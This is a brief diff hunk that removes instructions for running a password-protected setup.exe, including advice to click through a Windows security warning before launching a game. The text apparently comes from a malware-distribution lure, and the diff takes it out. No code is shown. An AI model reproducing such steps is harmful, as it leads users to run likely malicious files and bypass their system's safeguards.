@@ -1,7 +1,0 @@
-1. Move setup.exe to Desktop
-2. Run setup.exe
-3. Confirm Windows Blocker and continue run
-4. After program close run game
-5. Good luck!
-
-PASSWORD TO setup.exe - 2022K
